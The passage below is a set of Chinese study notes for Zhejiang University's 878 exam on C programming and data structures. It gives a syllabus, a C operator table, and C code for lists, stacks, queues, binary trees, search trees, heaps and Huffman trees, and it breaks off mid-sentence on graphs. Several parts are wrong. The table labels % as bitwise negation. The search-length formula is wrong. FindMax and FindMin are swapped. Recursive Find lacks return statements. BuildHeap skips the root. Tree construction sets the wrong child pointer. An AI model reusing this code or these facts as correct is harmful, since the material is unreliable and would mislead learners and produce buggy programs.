[{"content":"2023年浙江大学研究生入学考试 ——《计算机专业基础》(878) 考试大纲\nⅠ考查目标 《计算机专业基础》(878) 综合考试涵盖程序设计、数据结构两门专业基础课程.要考生比较系统地掌握上述专业基础课程的基本概念、基本原理和基本方法, 能够综合运所学的基本原理和基本方法分析、判断和解决有关理论问题和实际问题.\nⅡ考试形式和试卷结构 一、试卷满分及考试时间 本试卷满分为150分, 考试时间为180分钟\n二、答题方式 答题方式为闭卷、笔试\n三、试卷内容结构 程序设计基础(C) 60分 数据结构90分\n四、试卷题型结构 单项选择题70分(35小题, 每小题2分)\n综合应用题80分\nⅢ考查范围 程序设计基础(C) 【考查目标】\n理解C程序设计语言结构, 掌握数据表示和输入输出的基本方法, 掌握流程控制、函数设计与调用方法; 理解模块化程序设计方法, 掌握基本的C语言程序设计过程和技巧; 掌握初步的算法设计及数据组织方法, 具备基本的问题分析和利用C语言进行求解问题的能力. 第一级 运算符 含义 使用 结合方向 [] 数组下标 数组名字[常量表达式] 左到右 () 圆括号 表达式 或 函数名(形参) 左到右 . 取成员 对象 . 成员名 左到右 -\u0026gt; 成员选择(指针) 对象指针 -\u0026gt; 成员名 左到右 第二级 运算符 含义 使用 结合方向 - 负号运算符 - 表达式 右到左 ~ 按位取反运算符 ~ 表达式 右到左 ++ 自增运算符 ++ 表达式 ++ 右到左 -- 自减运算符 \u0026ndash; 表达式 \u0026ndash; 右到左 * 取值运算符 * 指针变量 右到左 \u0026amp; 取地址运算符 \u0026amp; 变量名 右到左 ! 逻辑非运算符 ! 表达式 右到左 (类型) 强制类型转换 (数据类型) 表达式 右到左 sizeof 长度运算符 sizeof(表达式) 右到左 第三级 运算符 含义 使用 结合方向 / 除 表达式 / 表达式 左到右 * 乘 表达式 * 表达式 左到右 % 按位取反运算符 % 表达式 左到右 第四级 运算符 含义 使用 结合方向 + 加 表达式 + 表达式 左到右 - 减 表达式 - 表达式 左到右 第五级 运算符 含义 使用 结合方向 \u0026lt;\u0026lt; 左移 变量 \u0026laquo; 表达式 左到右 \u0026gt;\u0026gt; 右移 变量 \u0026raquo; 表达式 左到右 第六级 运算符 含义 使用 结合方向 \u0026gt; 大于 表达式 \u0026gt; 表达式 左到右 \u0026gt;= 大于等于 表达式 \u0026gt;= 表达式 左到右 \u0026lt; 小于 表达式 \u0026lt; 表达式 左到右 \u0026lt;= 小于等于 表达式 \u0026lt;= 表达式 左到右 第七级 运算符 含义 使用 结合方向 == 等于 表达式 == 表达式 左到右 != 不等于 表达式 != 表达式 左到右 第八 ~ 十二级 运算符 含义 使用 结合方向 \u0026amp; 按位与 表达式 \u0026amp; 表达式 左到右 ^ 按位异或 表达式 ^ 表达式 左到右 | 按位或 表达式 | 表达式 左到右 \u0026amp;\u0026amp; 逻辑与 表达式 \u0026amp;\u0026amp; 表达式 左到右 || 逻辑或 表达式 || 表达式 左到右 第十三级 运算符 含义 使用 结合方向 ?: 条件运算符 表达式 1 ？表达式 2 : 表达式 3 右到左 第十四级 运算符 含义 使用 结合方向 = 赋值运算符 变量 = 表达式 右到左 /= 除后赋值 变量 /= 表达式 右到左 *= 乘后赋值 变量 ** 表达式 右到左 %= 取模赋值 变量 %% 表达式 右到左 += 加后赋值 变量 ++ 表达式 右到左 -= 减后赋值 变量 \u0026ndash; 表达式 右到左 \u0026lt;\u0026lt;= 左移后赋值 变量 \u0026laquo;= 表达式 右到左 \u0026gt;\u0026gt;= 右移后赋值 变量 \u0026raquo;= 表达式 右到左 \u0026amp;= 按位与后赋值 变量 \u0026amp;= 表达式 右到左 ^= 按位异或后赋值 变量 ^= 表达式 右到左 |= 按位或后赋值 变量 |= 表达式 右到左 第十五级 运算符 含义 使用 结合方向 , 逗号运算符 变量 , 表达式 左到右 同级依照结合方向顺序.\n一、数据表达与组织 (一) 常量, 变量, 运算与表达式 (二) 一维和二维数组, 字符数组和字符串 (三) 指针与数组, 结构与数组 (四) 指针与结构, 单向链表\n二、语句及流程控制 (一) 复合语句 (二) 分支控制(if、switch) (三) 循环控制(for、while、do—while)\n三、程序结构和函数 (一) C程序结构 (二) 函数的定义、参数传递和调用 (三) 函数的递归调用 (四) 变量的存储类别、作用域, 全局变量和局部变量\n四、输入/输出和文件 (一) 标准输入和输出 (二) 文本文件与二进制文件 (三) 文件打开、关闭、读写和定位\n五、编译预处理和命令行参数 (一) 宏定义和宏函数 (二) 命令行参数和使用\n六、基本算法设计与程序实现 (一) 简单排序算法(插入、选择、冒泡) 、二分查找 (二) 链表、文件中查找 (三) 级数求和、进制转换\n查找 平均查找长度 : 设找到集合中第 i 个记录的概论是 $p_i(\\sum_{i=0}^{N-1} p_i = 1)$ 且需要 n_i 次才很找到, 则平均查找长度为 $\\sum_{i=0}^{N-1} p_i n_i = 1$\n二分查找\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #define NotFound 0 Position BinarySearch(List Tb1, ElementType K) { Position left, right, mid; left = 1; right = Tb1 -\u0026gt; Last; while(left \u0026lt;= right) { mid = (left + right) / 2; if(K \u0026lt; Tb1 -\u0026gt; Data[mid]) right = mid - 1; else if(K \u0026gt; Tb1 -\u0026gt; Data[mid]) left = mid + 1; else return mid; } return NotFound; } 数据结构 【考查目标】\n掌握数据结构的基本概念、基本原理和基本方法; 掌握数据的逻辑结构、存储结构及基本操作的实现, 能够对算法进行基本的时间复杂度与空间复杂度的分析; 能应用数据结构基本原理和方法进行问题的分析与求解, 具备采用C或C++语言设计与实现算法的能力. 一、栈、队列和数组 类型: 线性表 概念: 表头, 表尾, 前驱, 后继\n顺序存储实现 从下表 0 开始存, Last指向最后一个元素所在位置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 typedef int ElementType; typedef int Position; /* 数组下标 */ typedef struct LNode* PtrToLNode; struct LNode { ElementType Data[MAXSIZE]; Position Last; /* 记录线性表的最后一个元素所在位置(初始 -1) */ }; typedef PtrToLNode List; List MakeEmpty(){ List L; L = (List)malloc(sizeof(struct LNode)); L -\u0026gt; Last = -1; return L; } Position Find(List L, ElementType X) { Position i = 0; while(i \u0026lt;= L -\u0026gt; Last \u0026amp;\u0026amp; L -\u0026gt; Data[i] != X) i ++; if(i \u0026gt; L -\u0026gt; Last) return ERROR; return i; } /* 在为序 i 前插入一个新元素 */ bool Insert(List L, ElementType X, int i) { Position j; if(L -\u0026gt; Last == MAXSIZE - 1) { printf(\u0026#34;表满\u0026#34;); return false; } if(i \u0026lt; 1 || i \u0026gt; L -\u0026gt; Last + 2) { printf(\u0026#34;位序不合法\u0026#34;); return false; } for(j = L -\u0026gt; Last; j \u0026gt;= i - 1; j --) L -\u0026gt; Data[j + 1] = L -\u0026gt; Data[j]; L -\u0026gt; Data[i - 1] = X; L -\u0026gt; Last ++; return true; } /* 删除为序为 i 的元素 */ bool Delete(List L, int i) { Position j; if(i \u0026lt; 1 || i \u0026gt; L -\u0026gt; Last + 1) { printf(\u0026#34;位序不合法\u0026#34;); return false; } for(j = i; j \u0026lt;= L -\u0026gt; Last; j ++) L -\u0026gt; Data[j - 1] = L -\u0026gt; Data[j]; L -\u0026gt; Last --; return true; } 链式存储实现 没有头节点！header指针直接指向第一个元素\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 typedef int ElementType; typedef struct LNode * PtrToLNode; struct LNode{ ElementType Data; PtrToLNode Next; }; typedef PtrToLNode Position; typedef PtrToLNode List; int Length(List L) { Position p; int cnt = 0; p = L; while(p) { p = p -\u0026gt; Next; cnt ++; } return cnt; } /* 查找第 k 个元素 */ ElementType FindKth(List L, int K) { Position p; int cnt = 1; p = L; while(p \u0026amp;\u0026amp; cnt \u0026lt; K) { p = p -\u0026gt; Next; cnt ++; } if((cnt == K) \u0026amp;\u0026amp; p) return p -\u0026gt; Data; else return ERROR; } /* 查找第一个值为 X 的元素的地址 */ Position Find(List L, ElementType X) { Position p = L; while(p \u0026amp;\u0026amp; p -\u0026gt; Data != X) p = p -\u0026gt; Next; if(p) return p; else return NULL; } /* 在指定为序 i 前插入元素 X, 如果该链表有空的头节点, 则可省略 i==1 的特判 */ List Insert(List L, ElementType X, int i) { Position tmp, pre; tmp = (Position)malloc(sizeof(struct LNode)); tmp -\u0026gt; Data = X; if(i == 1) { tmp -\u0026gt; Next = L; return tmp; } else { int cnt = 1; pre = L; while(pre \u0026amp;\u0026amp; cnt \u0026lt; i - 1) { pre = pre -\u0026gt; Next; cnt ++; } if(pre == NULL || cnt != i - 1) { printf(\u0026#34;插入位置参数错误！\u0026#34;); free(tmp); return NULL; } else { tmp -\u0026gt; Next = pre -\u0026gt; Next; pre -\u0026gt; Next = tmp; return L; } } } /* 删除为序为 i 的元素 */ bool Delete(List L, int i) { Position tmp, pre = L; int cnt = 0; while(pre \u0026amp;\u0026amp; cnt \u0026lt; i - 1) { pre = pre -\u0026gt; Next; cnt ++; } if(pre == NULL || cnt != i - 1 || pre -\u0026gt; Next == NULL) { printf(\u0026#34;插入位置参数错误！\u0026#34;); return false; } else { tmp = pre -\u0026gt; Next; pre -\u0026gt; Next = tmp -\u0026gt; Next; free(tmp); return true; } } (一) 栈和队列的基本概念\n栈 Stack(后入先出 First In Last OUT)\n应用:\n全排列 n! .\n后缀表达式的计算.\n将中缀表达式转化为后缀表达式(注意: 1.运算数直接输出 2.左括号入栈 3.遇到右括号一直弹出栈内运算符直到左括号(左右括号弹出但不用输出) 4. 运算符小于等于栈顶运算符则一直输出栈顶直到该运算符大于栈顶为止 5.处理完毕, 栈内全部输出) .\n迷宫问题(模拟 DFS) ,函数调用和递归实现\n队列 Queue(先进先出 First In First OUT)\n简单法: Front 放数组下标小的, Rear 放大的, 容易出现‘假溢出’.\n循环队列: Front = Rear = 0, 元素个数 n + 1 种情况, 但是 Front 与 Rear 之间差距最多 n 种情况.\n法一: 增设变量 Size , 或最后一次操作是什么入队还是出队的 Flag .\n法二: 少用一个元素空间, 堆满条件: (Rear + 1) % MaxSize == Front; 队空: Rear == Front. 应用: 多项式加法运算(用链表也可以, 返回结果多项式, 不改变原有多项式) BFS\n(二) 栈和队列的顺序存储结构 (三) 栈和队列的链式存储结构 (四) 栈和队列的应用\n顺序栈, Top 指针从 -1 开始, MaxSize - 1 为满\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 typedef int ElementType; typedef int Position; typedef struct SNode *PtrToSNode; struct SNode{ ElementType *Data; Position Top; /*栈顶指针, -1 为空, MaxSize - 1 为满 */ int MaxSize; }; typedef PtrToSNode Stack; Stack CreatStack(int MaxSize) { Stack S = (Stack)malloc(sizeof (struct SNode)); S -\u0026gt; Data = (ElementType *)malloc(MaxSize * sizeof(ElementType)); S -\u0026gt; Top = -1; S -\u0026gt; MaxSize = MaxSize; return S; } bool IsFull(Stack S) { return (S -\u0026gt; Top == S -\u0026gt; MaxSize -1); } bool Push(Stack S, ElementType X) { if(IsFull(S)) { printf(\u0026#34;堆栈满\u0026#34;); return false; } S -\u0026gt; Data[++(S -\u0026gt; Top)] = X; return true; } bool IsEmpty(Stack S) { return (S -\u0026gt; Top == -1); } ElementType Pop(Stack S) { if(IsEmpty(S)) { printf(\u0026#34;堆栈空\u0026#34;); return ERROR; } return S -\u0026gt; Data[(S -\u0026gt; Top)--]; } 还有双栈, 最大化利用数组空间, 一个 Top 从 -1 开始, 另一个从 MaxSize 开始.\n链栈, 头节点的 Next 就指向链表的头节点.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 typedef struct SNode * PtrToSNode; struct SNode{ ElementType Data; PtrToSNode Next; }; typedef PtrToSNode Stack; Stack CreatStack(int MaxSize) { Stack S; S = (Stack)malloc(sizeof (struct SNode)); S -\u0026gt; Next = NULL; return S; } bool Push(Stack S, ElementType X) { PtrToSNode TmpCell; TmpCell = (PtrToSNode)malloc(sizeof(struct SNode)); TmpCell -\u0026gt; Data = X; TmpCell -\u0026gt; Next = S -\u0026gt; Next; S -\u0026gt; Next = TmpCell; return true; } bool IsEmpty(Stack S) { return (S -\u0026gt; Next == NULL); } ElementType Pop(Stack S) { if(IsEmpty(S)) { printf(\u0026#34;堆栈空\u0026#34;); return ERROR; } PtrToSNode FirstCell; ElementType TopElem; FirstCell = S -\u0026gt; Next; TopElem = FirstCell -\u0026gt; Data; S -\u0026gt; Next = FirstCell -\u0026gt; Next; free(FirstCell); return TopElem; } 队列　数组实现\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 typedef int Position; typedef struct QNode * PtrToQNode; struct QNode { ElementType * Data; Position Front, Rear; int MaxSize; }; typedef PtrToQNode Queue; Queue CreateQueue(int MaxSize) { Queue Q = (Queue)malloc(sizeof(struct QNode)); Q -\u0026gt; Data = (ElementType *)malloc(MaxSize * sizeof(ElementType)); Q -\u0026gt; Front = Q -\u0026gt; Rear = 0; Q -\u0026gt; MaxSize = MaxSize; return Q; } bool IsFull(Queue Q) {　return ((Q -\u0026gt; Rear + 1) % Q -\u0026gt; MaxSize == Q -\u0026gt; Front);} bool Add(Queue Q, ElementType X) { if(IsFull(Q)) { printf(\u0026#34;队列满\u0026#34;); return false; } Q -\u0026gt; Rear = (Q -\u0026gt; Rear + 1) % Q -\u0026gt; MaxSize; Q -\u0026gt; Data[Q -\u0026gt; Rear] = X; return true; } bool IsEmpty(Queue Q) {　return (Q -\u0026gt; Front == Q -\u0026gt; Rear);} ElementType Delete(Queue Q) { if(IsEmpty(Q)) { printf(\u0026#34;队列空\u0026#34;); return ERROR; } Q -\u0026gt; Front = (Q -\u0026gt; Front + 1) % Q -\u0026gt; MaxSize; return Q -\u0026gt; Data[Q -\u0026gt; Front]; } 链表实现, 不带头节点的链表实现队列\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 typedef struct Node * PtrToNode; struct Node{ ElementType Data; PtrToNode Next; }; typedef PtrToNode Position; typedef struct QNode * PtrToQNode; struct QNode { Position Front, Rear; }; typedef PtrToQNode Queue; Queue CreateQueue(int MaxSize) { Queue Q = (Queue)malloc(sizeof(struct QNode)); Q -\u0026gt; Front = Q -\u0026gt; Rear = NULL; return Q; } bool Add(Queue Q, ElementType X) { Position Tmp = (Position)malloc(sizeof(struct Node)); Tmp -\u0026gt; Data = X; Tmp -\u0026gt; Next = NULL; if(Q -\u0026gt; Rear == NULL){ Q -\u0026gt; Rear = Q -\u0026gt; Front = Tmp; return true; } Q -\u0026gt; Rear -\u0026gt; Next = Tmp; Q -\u0026gt; Rear = Tmp; return 0; } bool IsEmpty(Queue Q) {　return(Q -\u0026gt; Front == NULL);} ElementType Delete(Queue Q) { Position FrontCell; ElementType FrontElem; if(IsEmpty(Q)) { printf(\u0026#34;队列空\u0026#34;); return ERROR; } FrontCell = Q -\u0026gt; Front; if(Q -\u0026gt; Front == Q -\u0026gt; Rear) Q -\u0026gt; Front = Q -\u0026gt; Rear = NULL; else Q -\u0026gt; Front = Q -\u0026gt; Front -\u0026gt; Next; FrontElem = FrontCell -\u0026gt; Data; free(FrontCell); return FrontElem; } 二、树与二叉树 (一) 树的基本概念\nTree\n树根, 子树, 父节点, N-1 条边, 森林 \u0026mdash; 任何一棵树都是一个二元组 Tree = (Root, Forest)\n结点的度: 子树的个数\n树的度: 树所有结点中最大的度\n叶节点: 度为 0 的结点\n父节点: 具有子树, 则其为其子树根节点的父节点 ; 子节点: 与父节点相反\n兄弟结点: 有同一父节点的彼此\n祖先结点: 沿树根到某节点路径上的所有结点都是\n子孙结点: 某结点的子树中的所有结点\n结点的层次: 根为 1 , 其余为其父节点层数 +1\n树的深度: 所有结点中最大层次\n树的高度: 其所有子节点的最大高度层数 +1, 叶节点为 1\n分支: 两个相邻结点的分边\n路径: 结点序列; 路径长度: 路径包含的边数 = 结点数 - 1\n(二) 二叉树 1. 二叉树的定义及其主要特性 2. 二叉树的顺序存储结构和链式存储结构 3. 二叉树的遍历\nBinary Tree\n每个结点至多两个子树, 有左右序之分\n斜二叉树(退化二叉树): 深度 N, 退化为线性表\n完美二叉树(满二叉树): 所有分支结点都有左右子树, 且叶节点在同一层 $2^N - 1$\n完全二叉树: 叶节点只会出现在最下层或次下层,且最下层叶节点都在左部\n对于任何非空二叉树: $n_0$ 为叶节点数, $n_2$ 为度为 2 的节点数, 则 $n_0= n_2+ 1$\n具有 n 个结点的完全二叉树深度 $\\left \\lfloor \\log_2 n \\right \\rfloor +1$\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 typedef struct TNode * BTPosition; typedef BTPosition BinTree; struct TNode { ElementType Data; BinTree Left; BinTree Right; }; void OrderTraversal(BinTree BT) { if(BT) { /* 此处加入判断叶节点, 则可实现遍历叶节点 */ /* 先序遍历 （根左右）*/ OrderTraversal(BT -\u0026gt; Left); /* 中序遍历 （左根右）*/ OrderTraversal(BT -\u0026gt; Right); /* 后序遍历 （左右根）*/ } } void InorderTraversal(BinTree BT) { BinTree T = BT; Stack S = CreatStack(); while(T || !IsEmpty(S)) { while(T) { Push(S, T); T = T -\u0026gt; Left; } T = (BinTree)Pop(S); /* T -\u0026gt; Data 访问结点 */ T = T -\u0026gt; Right; } } /*层序遍历*/ void LevellorderTraversal(BinTree BT) { Queue Q; BinTree T; if(!BT) return; Q = CreatQueue(); Add(Q, BT); while(!IsEmpty(Q)) { T = (BinTree)Delete(Q); /* 取出结点 */ if(T -\u0026gt; Left) Add(Q, T -\u0026gt; Left); if(T -\u0026gt; Right) Add(Q, T -\u0026gt; Right); } } int GetHight(BinTree BT) { int HL, HR, MaxH; if(BT) { HL = GetHight(BT -\u0026gt; Left); HR = GetHight(BT -\u0026gt; Right); MaxH = HL \u0026gt; HR ? HL : HR; return (MaxH + 1); } return 0; } /*层序生成二叉树*/ BinTree CreatBinTree(){ int Data; BinTree BT, T; Queue Q = CreatQueue(); // 输入根节点 scanf(\u0026#34;%d\u0026#34;, \u0026amp;Data); if(Data != 0) { BT = (BinTree)malloc(sizeof(struct TNode)); BT -\u0026gt; Data = Data; BT -\u0026gt; Left = BT -\u0026gt; Right = NULL; Add(Q, BT); } else return NULL; while(!IsEmpty(Q)) { T = (BinTree)Delete(Q); scanf(\u0026#34;%d\u0026#34;, \u0026amp;Data); if(Data != 0) { T -\u0026gt; Left = (BinTree)malloc(sizeof(struct TNode)); T -\u0026gt; Left -\u0026gt; Data = Data; T -\u0026gt; Left -\u0026gt; Left = T -\u0026gt; Left -\u0026gt; Right = NULL; Add(Q, T -\u0026gt; Left); } else T -\u0026gt; Left = NULL; scanf(\u0026#34;%d\u0026#34;, \u0026amp;Data); if(Data != 0) { T -\u0026gt; Right = (BinTree)malloc(sizeof(struct TNode)); T -\u0026gt; Right -\u0026gt; Data = Data; T -\u0026gt; Right -\u0026gt; Left = T -\u0026gt; Left -\u0026gt; Right = NULL; Add(Q, T -\u0026gt; Right); } else T -\u0026gt; Right = NULL; } } (三) 树、森林 1. 树的存储结构 \u0026ndash; 数组(根为 1),链表. 2. 森林与二叉树的转换 3. 树和森林的遍历\n唯一确定一棵二叉树的方法\n先序 / 后序 + 中序\n善于利用根的位置关系, 与子树大小\n树与二叉树的转换\n兄弟结点之间连边 只保留第一个儿子的边 旋转调整为二叉树 森林与二叉树的转换\n对每棵树各自转换为二叉树 每棵树的根节点看作兄弟结点, 连边 调整为二叉树 二叉树转森林或树 若根节点有右儿子, 则转化为森林\n把根的右儿子断开, 根的右儿子的右儿子 \u0026hellip; 断开 把各各部分转化为树 二叉树转树为上面的逆 森林的遍历\n理论上应当把森林转化为二叉树后遍历, 实际效果等同于一次对各棵树作各种遍历, 没有后序遍历\n(四) 树与二叉树的应用 1. 二叉排序树 2. 堆结构 3. 哈夫曼(Huffman) 树和哈夫曼编码\n二叉排序 / 搜索树 各键值彼此不同, 不会有重复元素\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 typedef struct TNode * BSTPosition; typedef BSTPosition BinTree; struct TNode { ElementType Data; BinTree Left; BinTree Right; }; void OrderTraversal(BinTree BT) { if(BT) { OrderTraversal(BT -\u0026gt; Left); OrderTraversal(BT -\u0026gt; Right); } } BSTPosition Find(BinTree BST, ElementType X) { if(!BST) return NULL; if(X \u0026gt; BST -\u0026gt; Data) { Find(BST -\u0026gt; Right, X); } else if(X \u0026lt; BST -\u0026gt; Data) { Find(BST -\u0026gt; Left, X); } else return BST; } BSTPosition FindMax(BinTree BST) { if(!BST) return NULL; else if(!BST -\u0026gt; Left) return BST; else return FindMax(BST -\u0026gt; Left); } BSTPosition FindMin(BinTree BST) { if(BST) while (BST -\u0026gt; Right) { BST = BST -\u0026gt; Right; } return BST; } BSTPosition Insert(BinTree BST, ElementType X) { if(!BST) { BST = (BSTPosition) malloc (sizeof(struct TNode)); BST -\u0026gt; Data = X; BST -\u0026gt; Left = BST -\u0026gt; Right = NULL; } else { if(X \u0026lt; BST -\u0026gt; Data) BST -\u0026gt; Left = Insert(BST -\u0026gt; Left, X); else if(X \u0026gt; BST -\u0026gt; Data) BST -\u0026gt; Right = Insert(BST -\u0026gt; Right, X); /*X 已存在则什么都不做*/ } return BST; } BinTree Delete(BinTree BST, ElementType X) { BSTPosition Tmp; if(!BST) printf(\u0026#34;要删除的元素未找到\u0026#34;); else { if(X \u0026lt; BST -\u0026gt; Data) BST -\u0026gt; Left = Delete(BST -\u0026gt; Left, X); else if(X \u0026gt;BST -\u0026gt; Data) BST -\u0026gt; Right = Delete(BST -\u0026gt; Right, X); else { // 应当删除的结点 if(BST -\u0026gt; Left \u0026amp;\u0026amp; BST -\u0026gt; Right) { Tmp = FindMin(BST -\u0026gt; Right); // 找右子树的最小结点 BST -\u0026gt; Data = Tmp -\u0026gt; Data; BST -\u0026gt; Right = Delete(BST -\u0026gt; Right, BST -\u0026gt; Data); } else { /* 只有一个儿子或没有儿子 */ Tmp = BST; if(!BST -\u0026gt; Left) // 只有右儿子或者没有子结点(NULL), BST = BST -\u0026gt; Right; else BST = BST -\u0026gt; Left; free(Tmp); } } } return BST; } 堆结构 Heap Priority Queue\n起始单元为 1, 父节点 $\\lfloor i / 2 \\rfloor $, 子结点 $2i , 2i+1$\n兄弟之间不存在约束关系\n0 可以放一个 MAXDATA 在插入时可以有用, 可以自动在 0处跳出循环\n删除是用数组的最后一个元素放到根节点上再调整\n建立: 从第 $\\lfloor n / 2 \\rfloor $个结点开始(最后一个有儿子的结点) O(N)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 typedef struct HNode *Heap; struct HNode { ElementType *Data; int Size; int Capacity; }; typedef Heap MaxHeap; #define MaxData 998244353 /* 比所有元素大或小的元素作为哨兵 */ MaxHeap CreatHeap(int MaxSize) { MaxHeap H = (MaxHeap)malloc(sizeof(struct HNode)); H -\u0026gt; Data = (ElementType*)malloc((MaxSize + 1) * sizeof(ElementType)); H -\u0026gt; Size = 0; H -\u0026gt; Capacity = MaxSize; H -\u0026gt; Data[0] = MaxData; /* 设置哨兵 */ return H; } bool IsFull(MaxHeap H) { return H -\u0026gt; Size == H -\u0026gt; Capacity; } bool Insert(MaxHeap H, ElementType X) { if(IsFull(H)) { printf(\u0026#34;最大堆已满\u0026#34;); return false; } int idx = ++ H -\u0026gt; Size; /* 指向应当插入的位置 */ /* 上滤 X */ for( ; H -\u0026gt; Data[idx / 2] \u0026lt; X; idx /= 2) H -\u0026gt; Data[idx] = H -\u0026gt; Data[idx / 2]; H -\u0026gt; Data[idx] = X; return true; } bool IsEmpty(MaxHeap H) { return (H -\u0026gt; Size == 0); } ElementType DeleteMax(MaxHeap H) { int Parent, Child; ElementType MaxItem, X; if(IsEmpty(H)) { printf(\u0026#34;最大堆为空\u0026#34;); return false; } MaxItem = H -\u0026gt; Data[1]; X = H -\u0026gt; Data[H -\u0026gt; Size --]; /* 规模减小并且取出最后元素 */ for(Parent = 1; Parent * 2 \u0026lt;= H -\u0026gt; Size; Parent = Child) { Child = Parent * 2; /* Child指向左右儿子中大的 */ if((Child != H -\u0026gt; Size) \u0026amp;\u0026amp; (H -\u0026gt; Data[Child] \u0026lt; H -\u0026gt; Data[Child + 1])) Child ++; /* 找到位置 */ if(X \u0026gt;= H -\u0026gt; Data[Child]) break; /* 下滤 X */ else H -\u0026gt; Data[Parent] = H -\u0026gt; Data[Child]; } H -\u0026gt; Data[Parent] = X; return MaxItem; } /* 将以 p 为根的子堆调整为最大堆 */ void PercDown(MaxHeap H, int p) { int Parent, Child; ElementType X; X = H -\u0026gt; Data[p]; for(Parent = p; Parent * 2 \u0026lt;= H -\u0026gt; Size; Parent = Child) { Child = Parent * 2; if((Child != H -\u0026gt; Size) \u0026amp;\u0026amp; (H -\u0026gt; Data[Child] \u0026lt; H -\u0026gt; Data[Child + 1])) Child ++; if(X \u0026gt;= H -\u0026gt; Data[Child]) break; else H -\u0026gt; Data[Parent] = H -\u0026gt; Data[Child]; } H -\u0026gt; Data[Parent] = X; } void BuildHeap(MaxHeap H) { for(int i = H -\u0026gt; Size / 2; i \u0026gt; 1; i --) PercDown(H, i); } 哈夫曼(Huffman) 树和哈夫曼编码 设 n 结点的树, 叶节点带权值 $W_k$, 从根到叶的长度 $l_k$, 则树的带权路径长度 WPL = $\\sum_{k=1}^{n} W_k L_k$\n树形可能不同, WPL 最小\n复杂度 O(NlogN)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 typedef struct HTNode *HuffmanTree; struct HTNode { int Weight; HuffmanTree Left; HuffmanTree Right; }; HuffmanTree Huffman(MinHeap H) { int i, N; HuffmanTree T; BuildHeap(H); /* 调整 O(N)*/ N = H -\u0026gt; Size; /* 作 Size - 1 次合并 */ for(int i = 1; i \u0026lt; N; i ++) { T = (HuffmanTree)malloc(sizeof(struct HTNode)); T -\u0026gt; Left = DeleteMin(H); T -\u0026gt; Right = DeleteMin(H); T -\u0026gt; Weight = T -\u0026gt; Left -\u0026gt; Weight + T -\u0026gt; Right -\u0026gt; Weight; Insert(H, T); } return DeleteMin(H); } 三、图 (一) 图的基本概念\nGraph\n非空有限集合 V, 边集合 E, G = (V, E), 数据对象是顶点\n无向图: (v, w)\n有向图: \u0026lt;v, w\u0026gt;\n简单图: 无重边, 无回路, 我们考虑的都是简单图\n邻接点: 边的端点互为邻接点, \u0026lt;v, w\u0026gt; v 邻接到 w, w 邻接自 v\n路径: 顶点序列, 相邻顶点间在图中有边\n简单路径: 除了首位顶点外, 其余顶点都不同\n回(环)路: 起点 == 终点; 简单回路: 简单路径的回路 (自环是自回路); 无向图的环路 \u0026gt;= 3 ; 有向图不存在回路 -\u0026gt; 无环图\n无向完全图: 任意两点都有边相连 $n(n-1)/2$; 有向完全图: 任意两点都有互为相反的两条弧相连 $n(n-1)$\n顶点的度: 该点边数; 入度 + 出度 = 度; 图的总入度 = 总出度 = 一半的度\n稠密图: 边数接近完全图; 稀疏图: 边数很少的图\n设图 G(V, E), 边数 |E|, 定点数 |V|;\n稠密图: 平均顶点度与顶点数目成正比的图 $|E| = k|V|^2( 0 \u0026lt; k \u0026lt; 1/2)$ 或者 $|E| \u0026gt; |V| \\log_2|V|$\n权: 边上的权值; 网图: 边上带权的图\n子图: G\u0026rsquo;(V\u0026rsquo;, E')\n连通图: 无向图中, 如果任意两点是连通的; 连通分量: 无向图的极大连通分量\n子图; 连通; 极大顶点数: 再加点会不连通; 极大边数: 包含依附于这些顶点的所有边 连通的无向图只有一个连通分量(本图)\n强连通图: 有向图中, 如果任意两点是连通的(双向路径);\n强连通分量: 有向图的极大连通分量\n连通的有向图只有一个连通分量(本图)\n生成树: 连通图, 包含全部顶点的极小连通子图\n有向图生成树: 恰有一个顶点的入度为 0(根), 其余点入度为 1\n生成森林: 一个生成树对应一个连通分量\n对无向图而言, 连通分量数 == 生成森林中树数\n对有向图而言, 非强连通图也可能只需要一棵生成树与之对应\n(二) 图的存储及基本操作\n邻接矩阵法 邻接表法 邻接多重表、十字链表 邻接矩阵法\n网图中 $\\infty$ 代表不存在边\n无向图所需存储元素个数 $|V| \\times (|V| - 1) / 2$\n优点: 很容易确定两点之间是否有边, 数邻接点只要遍历行或列\n局限性: 